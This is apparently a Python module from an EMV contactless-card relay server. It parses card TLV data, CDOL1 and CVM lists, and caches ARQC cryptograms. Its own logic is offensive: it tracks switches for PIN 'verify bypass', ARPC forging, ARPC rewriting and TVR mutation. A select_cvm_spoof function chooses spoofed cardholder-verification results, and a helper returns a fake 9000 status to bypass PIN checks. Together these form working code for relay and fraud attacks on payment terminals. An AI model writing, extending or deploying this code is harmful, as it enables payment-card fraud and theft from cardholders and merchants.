# -*- coding: utf-8 -*-
# emv.py

"""EMV domain: ArqcCache, SessionState, extraction, detection, helpers."""

from __future__ import annotations

import asyncio
from dataclasses import dataclass, field
from typing import Optional, List, Tuple, NamedTuple, Any

from tlv import find_tlv, build_tlv
from constants import (
    TEMPLATE_77, TEMPLATE_80, CID_NAME_MAP, CID_ARQC, CID_TC, CID_AAC,
    BRAND_UNKNOWN, brand_iad_default, SW_9000, SW_6F00,
    INS_GET_PROCESSING_OPTIONS, INS_GENERATE_AC, APDU_INS,
    detect_gpo_template, gac_p1_name,
)

import logging
log = logging.getLogger("RelayServer")


class MissingTagError(Exception):
    """Raised when an expected EMV tag is missing."""
    pass


class TLV(NamedTuple):
    tag: int
    length: int
    value: bytes
    rest: bytes


def parse_tlv(data: bytes, offset: int = 0) -> Tuple[int, int, bytes, bytes]:
    """
    Parse a single BER-TLV, supporting extended lengths.
    Returns (tag, length, value, rest_of_data).
    """
    if offset >= len(data):
        return TLV(0, 0, b"", b"")
    tag = data[offset]
    offset += 1
    if (tag & 0x1F) == 0x1F:
        while offset < len(data):
            b = data[offset]
            tag = (tag << 8) | b
            offset += 1
            if not (b & 0x80):
                break

    if offset >= len(data):
        return TLV(tag, 0, b"", b"")

    # extended length
    if data[offset] & 0x80:
        num_len_bytes = data[offset] & 0x7F
        offset += 1
        if num_len_bytes == 0 or offset + num_len_bytes > len(data):
            return TLV(tag, 0, b"", b"")
        length = int.from_bytes(data[offset:offset+num_len_bytes], 'big')
        offset += num_len_bytes
    else:
        length = data[offset]
        offset += 1
    value = data[offset:offset+length]
    rest = data[offset+length:]
    return TLV(tag, length, value, rest)

@dataclass
class ArqcCache:
    template: Optional[int] = None
    cid: Optional[int] = None
    atc: Optional[bytes] = None
    ac: Optional[bytes] = None
    iad: Optional[bytes] = None
    sdad: Optional[bytes] = None
    parse_notes: List[str] = field(default_factory=list)

    def is_complete(self) -> bool:
        """Return True when the core cached cryptogram fields are populated."""
        return all([self.cid is not None, self.atc, self.ac, self.iad])

    def is_forge_ready(self) -> bool:
        """Return True when the cache also has the response template required by the forge dispatcher.

        This is deliberately separate from ``is_complete()`` so existing callers
        that only need the cryptogram tuple retain their original semantics.
        """
        return self.template in (TEMPLATE_77, TEMPLATE_80) and self.is_complete()

    def clear(self) -> None:
        self.template = None
        self.cid = None
        self.atc = None
        self.ac = None
        self.iad = None
        self.sdad = None
        self.parse_notes.clear()

@dataclass
class SessionState:
    reader_addr: Optional[Any] = None
    phase: Any = "IDLE"
    seq: int = 0
    gpo_template: Optional[int] = None
    arqc_cache: ArqcCache = field(default_factory=ArqcCache)
    pending_capdu: Optional[bytes] = None
    pending_exchange_id: Optional[int] = None
    second_ae_pending: bool = False
    second_ae_reason: str = ""
    card_present: bool = False
    verify_bypass_enabled: bool = True
    arpc_forge_enabled: bool = True
    arpc_rewrite_enabled: bool = True
    tvr_mutation_enabled: bool = True
    verify_bypass_count: int = 0
    arpc_forge_count: int = 0
    arpc_rewrite_count: int = 0
    tvr_mutation_count: int = 0
    gac_response_count: int = 0
    brand: Optional[str] = BRAND_UNKNOWN
    selected_aid: Optional[bytes] = None
    # --- NEW: CVM fields ---
    cdol1_entries: Optional[list] = None   # list of (tag, length) from card's CDOL1
    cvm_entries: Optional[list] = None      # list of (method, condition) from card's CVM List
    auc: Optional[bytes] = None             # raw 9F07 AUC bytes from card
    cdcvm_verified: bool = False
    cdcvm_evidence: Optional[str] = None
    lock: asyncio.Lock = field(default_factory=asyncio.Lock)
    _cached_arqc: Optional[bytes] = None
    _cached_iad: Optional[bytes] = None
    _cached_atc: Optional[bytes] = None

    @property
    def cached_arqc(self) -> Optional[bytes]:
        if self.arqc_cache and self.arqc_cache.ac is not None:
            return self.arqc_cache.ac
        return self._cached_arqc

    @cached_arqc.setter
    def cached_arqc(self, val: Optional[bytes]) -> None:
        self._cached_arqc = val
        if self.arqc_cache:
            self.arqc_cache.ac = val

    @property
    def cached_iad(self) -> Optional[bytes]:
        if self.arqc_cache and self.arqc_cache.iad is not None:
            return self.arqc_cache.iad
        return self._cached_iad

    @cached_iad.setter
    def cached_iad(self, val: Optional[bytes]) -> None:
        self._cached_iad = val
        if self.arqc_cache:
            self.arqc_cache.iad = val

    @property
    def cached_atc(self) -> Optional[bytes]:
        if self.arqc_cache and self.arqc_cache.atc is not None:
            return self.arqc_cache.atc
        return self._cached_atc

    @cached_atc.setter
    def cached_atc(self, val: Optional[bytes]) -> None:
        self._cached_atc = val
        if self.arqc_cache:
            self.arqc_cache.atc = val

    def reset(self) -> None:
        self.seq += 1
        self.gpo_template = None
        self.arqc_cache.clear()
        self.pending_capdu = None
        self.pending_exchange_id = None
        self.second_ae_pending = False
        self.second_ae_reason = ""
        self.card_present = False
        self.verify_bypass_count = 0
        self.arpc_forge_count = 0
        self.arpc_rewrite_count = 0
        self.tvr_mutation_count = 0
        self.gac_response_count = 0
        self.brand = BRAND_UNKNOWN
        self.selected_aid = None
        # --- NEW: CVM fields reset ---
        self.cdol1_entries = None
        self.cvm_entries = None
        self.auc = None
        self.cdcvm_verified = False
        self.cdcvm_evidence = None
        self._cached_arqc = None
        self._cached_iad = None
        self._cached_atc = None

# ---------------------------------------------------------------------------
# DOL / CDOL parsing helpers
# ---------------------------------------------------------------------------

def parse_dol(value: bytes) -> List[Tuple[int, int]]:
    """Parse a DOL/CDOL stream as tag+length pairs.

    DOL data is not BER-TLV. It is a flat sequence of field definitions, so we
    interpret each item as <tag><length> and never recurse into it as nested TLV.
    """
    try:
        items: List[Tuple[int, int]] = []
        i = 0
        while i < len(value):
            first = value[i]
            i += 1
            tag = first
            if (first & 0x1F) == 0x1F:
                while i < len(value):
                    b = value[i]
                    tag = (tag << 8) | b
                    i += 1
                    if (b & 0x80) == 0:
                        break
                else:
                    break
            if i >= len(value):
                break
            length = value[i]
            i += 1
            items.append((tag, length))
        return items
    except Exception:
        return []


def parse_read_record_cdol(rapdu_or_value: bytes) -> List[Tuple[int, int]]:
    """Parse a READ RECORD response or raw DOL/CDOL value into a tag-length list.

    Accepts either a full READ RECORD RAPDU (with trailing SW) or a raw value that
    starts with tag 8C / 8D / 9F49.
    """
    try:
        if not rapdu_or_value:
            return []

        body = rapdu_or_value[:-2] if len(rapdu_or_value) >= 2 and rapdu_or_value[-2:] == SW_9000 else rapdu_or_value
        if not body:
            return []

        if len(body) >= 2 and body[0] == 0x8C:
            length = body[1]
            if length < 0x80 and 2 + length <= len(body):
                return parse_dol(body[2:2 + length])

        value = find_tlv(body, 0x8C)
        if value is None:
            if body and body[0] in (0x9F, 0x5F, 0xBF, 0x95, 0x9A, 0x9C):
                return parse_dol(body)
            return []
        return parse_dol(value)
    except Exception:
        return []


def extract_card_cvm_data(rapdu: bytes) -> Tuple[Optional[bytes], Optional[bytes], Optional[bytes]]:
    """
    Extract CDOL1 (tag 8C), CVM List (tag 8E), and AUC (tag 9F07)
    from a READ RECORD response (template 70 / 77 / raw).
    Returns (cdol1_raw, cvm_list_raw, auc_raw) or (None, None, None).
    """
    cdol1 = None
    cvm_list = None
    auc = None

    # Determine the TLV payload inside the response wrapper
    if len(rapdu) < 2:
        return None, None, None

    body = rapdu[:-2]  # strip SW
    if not body:
        return None, None, None

    first = body[0]
    if first == 0x70:
        # 70 READ RECORD template
        tlv_len = body[1]
        if tlv_len <= 0x7F:
            header = 2
        elif tlv_len == 0x81 and len(body) >= 3:
            header = 3
            tlv_len = body[2]
        elif tlv_len == 0x82 and len(body) >= 4:
            header = 4
            tlv_len = (body[2] << 8) | body[3]
        else:
            header = 2  # fallback
        if header + tlv_len <= len(body):
            tlv_data = body[header:header + tlv_len]
        else:
            tlv_data = body[header:]
    elif first == 0x77:
        # 77 Response Message Template Format 2
        tlv_len = body[1]
        if tlv_len <= 0x7F:
            header = 2
        elif tlv_len == 0x81 and len(body) >= 3:
            header = 3
            tlv_len = body[2]
        elif tlv_len == 0x82 and len(body) >= 4:
            header = 4
            tlv_len = (body[2] << 8) | body[3]
        else:
            header = 2
        if header + tlv_len <= len(body):
            tlv_data = body[header:header + tlv_len]
        else:
            tlv_data = body[header:]
    else:
        # No wrapper - assume raw TLV
        tlv_data = body

    # Scan for tags 8C, 8E, 9F07
    i = 0
    while i < len(tlv_data):
        tag = tlv_data[i]
        i += 1
        # Handle 2-byte tags (9Fxx, 5Fxx, BFxx)
        if tag in (0x9F, 0x5F, 0xBF):
            if i >= len(tlv_data):
                break
            tag = (tag << 8) | tlv_data[i]
            i += 1
        if i >= len(tlv_data):
            break
        length = tlv_data[i]
        i += 1
        if i + length > len(tlv_data):
            break
        value = tlv_data[i:i + length]
        i += length

        if tag == 0x8C:        # CDOL1
            cdol1 = value
        elif tag == 0x8E:      # CVM List
            cvm_list = value
        elif tag == 0x9F07:    # Application Usage Control (AUC)
            auc = value

    return cdol1, cvm_list, auc

# ---------------------------------------------------------------------------
# NEW: CDOL1 parser - returns list of (tag, length)
# ---------------------------------------------------------------------------

def parse_cdol1(cdol1_raw: bytes) -> list:
    """Parse EMV CDOL1 format into (tag, length) tuples."""
    return parse_dol(cdol1_raw)

# ---------------------------------------------------------------------------
# NEW: CVM List parser - returns list of (method, condition_code)
# ---------------------------------------------------------------------------

def parse_cvm_list(cvm_list_raw: bytes) -> list:
    """Parse CVM List (tag 8E) into (method, condition_code) tuples.

    EMV tag 8E layout is:
      - bytes 0..3: Amount X
      - bytes 4..7: Amount Y
      - bytes 8.. : CVM rules (2 bytes per rule)
    """
    entries = []
    start = 8 if len(cvm_list_raw) >= 10 else 0
    for i in range(start, len(cvm_list_raw), 2):
        if i + 1 >= len(cvm_list_raw):
            break
        method = cvm_list_raw[i]
        condition = cvm_list_raw[i + 1]
        entries.append((method, condition))
    return entries

# ---------------------------------------------------------------------------
# NEW: Select CVM spoof based on CVM List and AUC
# ---------------------------------------------------------------------------

def select_cvm_spoof(cvm_entries: list, auc: Optional[bytes] = None, cdcvm_verified: bool = False) -> Optional[Tuple[bytes, int]]:
    """
    Select the first viable CVM method for spoofing.
    Returns (spoof_9F34_bytes, spoof_9F35_byte) or None if no viable method.
    When cdcvm_verified=True, returns None to preserve 9F34=3F0000 from emulator.
    """
    if cdcvm_verified:
        log.info("[CVM-SPOOF] CDCVM evidence active: returning None to preserve 9F34=3F0000")
        return None

    # Check AUC byte 2 for forced-PIN requirement
    forced_pin = False
    if auc and len(auc) >= 2:
        # Mastercard: byte 2 bit 7 = PIN required
        # Visa: byte 2 bit 7 = PIN required
        forced_pin = bool(auc[1] & 0x40)

    cvm_map = {
        0x01: (b'\x01\x00\x00', 0x26),  # No CVM required
        0x03: (b'\x03\x00\x00', 0x26),  # No CVM required
        0x1E: (b'\x1E\x03\x00', 0x25),  # Signature
        0x1F: (b'\x1F\x03\x00', 0x24),  # Online PIN
        0x20: (b'\x20\x03\x00', 0x25),  # Offline PIN
    }

    # If forced PIN, prefer Online PIN regardless of CVM list
    if forced_pin:
        return cvm_map[0x1F]

    # Otherwise, find first viable method from CVM list
    for method, condition in cvm_entries:
        if method == 0x00 and condition == 0x00:
            continue  # Fail entry - skip
        method_id = method & 0x3F
        if method_id in cvm_map:
            return cvm_map[method_id]

    return None

# ---------------------------------------------------------------------------
# NEW: Build offset map from CDOL1 entries
# ---------------------------------------------------------------------------

def build_offset_map(entries: list) -> dict:
    """Build tag -> (offset, length) map from CDOL1 entries for a GENERATE AC payload."""
    offset_map = {}
    current_offset = 0
    for tag, length in entries:
        offset_map[tag] = (current_offset, length)
        current_offset += length
    return offset_map

# ===========================================================================
# EXISTING FUNCTIONS - UNCHANGED BELOW THIS LINE
# ===========================================================================

def extract_arqc_from_rapdu(rapdu: bytes, gpo_template: Optional[int]) -> ArqcCache:
    cache = ArqcCache()
    if len(rapdu) < 3:
        cache.parse_notes.append("FAIL: rapdu < 3 bytes")
        return cache
    body = rapdu[:-2]
    sw = rapdu[-2:]
    cache.parse_notes.append(f"SW={sw.hex().upper()}")
    if not body:
        cache.parse_notes.append("FAIL: body empty after SW strip")
        return cache
    first = body[0]
    cache.parse_notes.append(f"first_byte=0x{first:02X}")

    if first == TEMPLATE_77:
        cache.template = TEMPLATE_77
        cache.parse_notes.append("template=77 (BER-TLV)")
        cid_val = find_tlv(body, 0x9F27)
        atc_val = find_tlv(body, 0x9F36)
        ac_val = find_tlv(body, 0x9F26)
        iad_val = find_tlv(body, 0x9F10)
        if cid_val is None:
            cache.parse_notes.append("MISS: 9F27 (CID) not found in template 77")
        elif len(cid_val) < 1:
            cache.parse_notes.append("MISS: 9F27 value empty")
        else:
            cache.cid = cid_val[0]
            cid_name = CID_NAME_MAP.get(cache.cid, f"UNKNOWN(0x{cache.cid:02X})")
            cache.parse_notes.append(f"OK: CID=0x{cache.cid:02X} {cid_name}")
        if atc_val:
            cache.atc = atc_val
            cache.parse_notes.append(f"OK: ATC={atc_val.hex().upper()}")
        else:
            cache.parse_notes.append("MISS: 9F36 (ATC) not found")
        if ac_val:
            cache.ac = ac_val
            cache.parse_notes.append(f"OK: AC={ac_val.hex().upper()}")
        else:
            cache.parse_notes.append("MISS: 9F26 (AC) not found")
        if iad_val:
            cache.iad = iad_val
            cache.parse_notes.append(f"OK: IAD={iad_val.hex().upper()}")
        else:
            cache.parse_notes.append("MISS: 9F10 (IAD) not found")

    elif first == TEMPLATE_80:
        cache.template = TEMPLATE_80
        cache.parse_notes.append("template=80 (fixed format)")
        if len(body) < 2:
            cache.parse_notes.append("FAIL: template 80 body < 2 bytes")
            return cache
        length_first = body[1]
        if length_first < 0x80:
            length = length_first
            header_size = 2
        elif length_first == 0x81:
            if len(body) < 3:
                cache.parse_notes.append("FAIL: template 80 malformed 0x81 length")
                return cache
            length = body[2]
            header_size = 3
        elif length_first == 0x82:
            if len(body) < 4:
                cache.parse_notes.append("FAIL: template 80 malformed 0x82 length")
                return cache
            length = (body[2] << 8) | body[3]
            header_size = 4
        else:
            cache.parse_notes.append(f"FAIL: template 80 unsupported length form 0x{length_first:02X}")
            return cache

        payload = body[header_size:header_size + length]
        cache.parse_notes.append(f"declared_len={length} actual={len(payload)}")
        if len(payload) < 11:
            cache.parse_notes.append(f"FAIL: payload {len(payload)} < 11 (need CID+ATC+AC min)")
            return cache
        cache.cid = payload[0]
        cid_name = CID_NAME_MAP.get(cache.cid, f"UNKNOWN(0x{cache.cid:02X})")
        cache.parse_notes.append(f"OK: CID=0x{cache.cid:02X} {cid_name}")
        cache.atc = payload[1:3]
        cache.parse_notes.append(f"OK: ATC={cache.atc.hex().upper()}")
        cache.ac = payload[3:11]
        cache.parse_notes.append(f"OK: AC={cache.ac.hex().upper()}")
        cache.iad = payload[11:] if len(payload) > 11 else b""
        cache.parse_notes.append(
            f"OK: IAD={cache.iad.hex().upper()}" if cache.iad
            else "WARN: IAD empty (payload had no bytes after AC)"
        )
    else:
        cache.parse_notes.append(f"FAIL: unrecognized template 0x{first:02X}")
        if gpo_template in (TEMPLATE_77, TEMPLATE_80):
            cache.template = gpo_template
            cache.parse_notes.append(f"FALLBACK: inheriting GPO template 0x{gpo_template:02X}")

    return cache

def cid_indicates_arqc(cache: ArqcCache, rapdu: bytes) -> Tuple[bool, str]:
    if cache.cid is not None:
        if cache.cid == CID_ARQC:
            return True, "CID=0x80 ARQC parsed cleanly"
        if cache.cid == CID_TC:
            return False, "CID=0x40 TC (card offline-approved, no 2nd GAC expected)"
        if cache.cid == CID_AAC:
            return False, "CID=0x00 AAC (card offline-declined, no 2nd GAC will follow)"
        return False, f"CID=0x{cache.cid:02X} unrecognized (not ARQC)"

    if b"\x9F\x27\x01\x80" in rapdu:
        return True, "byte-scan fallback matched 9F 27 01 80"
    if b"\x9F\x27\x01\x40" in rapdu:
        return False, "byte-scan fallback matched 9F 27 01 40 (TC)"
    if b"\x9F\x27\x01\x00" in rapdu:
        return False, "byte-scan fallback matched 9F 27 01 00 (AAC)"
    return False, "CID unparseable AND no byte-scan hit - state machine cannot arm 2nd GAC forge"

def craft_verify_success_bytes() -> bytes:
    """Return SW=9000 for VERIFY bypass."""
    try:
        from protocol import craft_verify_success
        resp = craft_verify_success()
        if hasattr(resp, "to_bytes"):
            return resp.to_bytes()
        if hasattr(resp, "__bytes__"):
            return bytes(resp)
        if hasattr(resp, "raw"):
            return resp.raw
    except Exception:
        pass
    return SW_9000

def fix_gac_response_length(payload: bytes) -> Tuple[bytes, Optional[str]]:
    """Correct TLV length field in GAC response if mismatched."""
    if len(payload) < 4:
        return payload, None

    body = payload[:-2]
    sw = payload[-2:]
    if not body:
        return payload, None

    first = body[0]
    if first not in (TEMPLATE_77, TEMPLATE_80):
        return payload, None

    if len(body) < 2:
        return payload, None

    length_first = body[1]
    if length_first < 0x80:
        declared_len = length_first
        header_size = 2
    elif length_first == 0x81:
        if len(body) < 3:
            return payload, None
        declared_len = body[2]
        header_size = 3
    elif length_first == 0x82:
        if len(body) < 4:
            return payload, None
        declared_len = (body[2] << 8) | body[3]
        header_size = 4
    else:
        return payload, None

    actual_len = len(body) - header_size
    if actual_len == declared_len:
        return payload, None

    inner = body[header_size:]
    tag = bytes([first])

    if actual_len < 0x80:
        new_length_bytes = bytes([actual_len])
    elif actual_len < 0x100:
        new_length_bytes = bytes([0x81, actual_len])
    else:
        new_length_bytes = bytes([0x82, (actual_len >> 8) & 0xFF, actual_len & 0xFF])

    fixed = tag + new_length_bytes + inner + sw
    note = (f"template=0x{first:02X} declared_len={declared_len} "
            f"actual_len={actual_len} -> length byte rewritten")
    return fixed, note
